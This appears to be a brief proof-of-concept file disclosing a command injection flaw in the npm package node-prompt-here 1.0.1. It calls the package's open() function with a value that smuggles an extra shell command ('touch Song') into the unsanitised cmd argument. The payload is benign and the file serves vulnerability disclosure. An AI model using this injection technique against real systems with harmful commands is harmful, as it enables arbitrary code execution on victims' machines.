/**
 * node-prompt-here@1.0.1 is vulnerable to command injection.
 * 
 * The injection point is located in line 19 of file "index.js" in the open() function.
 * The argument "cmd" can be controlled by users without any sanitization. 
 */




var Root = require("node-prompt-here");
var root = new Root();
root.open('"& touch Song &"');
